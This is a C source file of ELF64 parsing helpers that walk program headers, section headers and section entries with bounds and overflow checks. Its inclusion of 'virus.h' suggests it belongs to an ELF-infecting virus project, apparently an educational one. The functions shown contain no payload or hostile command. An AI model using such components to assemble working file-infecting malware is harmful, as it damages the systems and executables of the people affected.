#include "accessors.h"
#include "virus.h"
#include "errors.h"

bool	foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data)
{
	const Elf64_Ehdr	*elf64_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (elf64_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	const Elf64_Off		phoff     = elf64_hdr->e_phoff;
	const Elf64_Half	phentsize = elf64_hdr->e_phentsize;
	Elf64_Half		phnum     = elf64_hdr->e_phnum;
	char			(*segments)[phnum][phentsize] = NULL;
	const size_t		array_size = phentsize * phnum;

	if (phentsize < sizeof(Elf64_Phdr)
	|| (array_size / phentsize != phnum)
	|| (!(segments = safe(ref, phoff, array_size))))
		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	while (phnum--)
	{
		size_t	elf64_seg_hdr = (size_t)(*segments)[phnum];
		size_t	offset        = elf64_seg_hdr - (size_t)elf64_hdr;

		if (!callback(ref, offset, data))
			return errors(ERR_THROW, _ERR_T_FOREACH_PHDR);
	}
	return true;
}

bool	foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data)
{
	const Elf64_Ehdr	*elf64_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (elf64_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	const Elf64_Off		shoff     = elf64_hdr->e_shoff;
	const Elf64_Half	shentsize = elf64_hdr->e_shentsize;
	Elf64_Half		shnum     = elf64_hdr->e_shnum;
	char			(*sections)[shnum][shentsize] = NULL;
	const size_t		array_size = shentsize * shnum;

	if (shentsize < sizeof(Elf64_Shdr)
	|| (array_size / shentsize != shnum)
	|| (!(sections = safe(ref, shoff, array_size))))
		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	while (shnum--)
	{
		size_t	elf64_section_hdr = (size_t)(*sections)[shnum];
		size_t	offset = elf64_section_hdr - (size_t)elf64_hdr;

		if (!callback(ref, offset, data))
			return errors(ERR_THROW, _ERR_T_FOREACH_SHDR);
	}
	return true;
}

bool	foreach_shdr_entry(struct safe_ptr ref, size_t offset, f_iter_callback callback, void *data)
{
	const Elf64_Ehdr	*ehdr = safe(ref, 0, sizeof(Elf64_Ehdr));
	const Elf64_Shdr	*shdr = safe(ref, offset, sizeof(Elf64_Shdr));

	if (ehdr == NULL || shdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	const Elf64_Off	sh_offset  = shdr->sh_offset;
	const uint64_t	sh_entsize = shdr->sh_entsize;
	const uint64_t	sh_size    = shdr->sh_size;

	if (sh_entsize == 0)
		return true;

	size_t		entnum = sh_size / sh_entsize;
	uint8_t		(*entries)[entnum][sh_entsize] = safe(ref, sh_offset, sh_size);

	if (sh_size / sh_entsize != entnum || entries == NULL)
		return false;

	while (entnum--)
	{
		size_t	entry_addr   = (size_t)(*entries)[entnum];
		size_t	entry_offset = entry_addr - (size_t)ehdr;

		if (!callback(ref, entry_offset, data))
			return false;
	}
	return true;
}
